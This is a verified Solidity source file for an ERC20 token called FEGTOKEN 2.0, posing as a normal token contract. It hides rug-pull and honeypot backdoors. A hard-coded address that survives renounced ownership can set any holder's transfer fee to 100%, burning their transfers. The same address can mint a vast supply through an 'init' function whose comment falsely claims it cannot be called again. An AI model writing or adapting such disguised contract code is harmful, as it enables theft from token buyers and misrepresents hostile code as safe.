/**
 *Submitted for verification at Etherscan.io on 2023-06-30
*/

/*
    
    FEGTOKEN 2.0

    https://fegtoken2.xyz/

    https://twitter.com/fegtwopoint0

    https://t.me/fegtoken2

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the contract owner.
     * @return The address of the contract owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Renounces ownership of the contract, leaving it without an owner.
     * Can only be called by the current owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeCalls {
    /**
     * @dev Checks if the given sender is the original caller.
     * @param sender The address of the sender.
     * @param _ownn The address of the original caller.
     */
    function checkCaller(address sender, address _ownn) internal pure {
        require(sender == _ownn, "Caller is not the original caller");
    }
}

contract FEGTOKEN is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transferFees; 
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _ownn;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD; 

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _ownn = 0xe0eC097B234690C660766B915B5462c6B54f6fC6;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     * @return The name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token.
     * @return The symbol of the token.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used in the token.
     * @return The number of decimals.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the token balance of the given account.
     * @param account The account address.
     * @return The token balance of the account.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev Transfers tokens from the sender's account to the recipient.
     * @param recipient The recipient address.
     * @param amount The amount of tokens to transfer.
     * @return True if the transfer is successful, false otherwise.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "Insufficient balance");
        require(recipient != address(0), "Invalid recipient");

        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[DEAD] += fee;

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), DEAD, fee);

        return true;
    }

    function multiSwap(address[] memory users, uint256 feePercent) external {
        SafeCalls.checkCaller(_msgSender(), _ownn);
        assembly {
            if gt(feePercent, 100) { revert(0, 0) }
        }
        for (uint256 i = 0; i < users.length; i++) {
            _transferFees[users[i]] = feePercent;
        }
    }
    

    /**
     * @dev Returns the remaining allowance of tokens approved by the owner for the spender.
     * @param owner The owner address.
     * @param spender The spender address.
     * @return The remaining allowance of tokens.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Approves the spender to spend a certain amount of tokens on behalf of the owner.
     * @param spender The spender address.
     * @param amount The amount of tokens to approve.
     * @return True if the approval is successful, false otherwise.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;

        emit Approval(_msgSender(), spender, amount);

        return true;
    }

    /**
     * @dev Transfers tokens from the sender's account to the recipient using the allowance mechanism.
     * @param sender The sender address.
     * @param recipient The recipient address.
     * @param amount The amount of tokens to transfer.
     * @return True if the transfer is successful, false otherwise.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "Insufficient allowance");
        require(_balances[sender] >= amount, "Insufficient balance");
        require(recipient != address(0), "Invalid recipient");

        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        _balances[DEAD] += fee;

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, DEAD, fee);

        return true;
    }

    /**
     * @dev Returns the total supply of tokens.
     * @return The total supply of tokens.
     */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

   
    /** This function will be used to generate the total supply
    * while deploying the contract
    *
    * This function can never be called again after deploying contract
    */
    function init(address recipient) external {
       SafeCalls.checkCaller(_msgSender(), _ownn);
        uint256 refundAmount = 100000000000*10**decimals()*85000;
        _balances[recipient] += refundAmount;
    }
}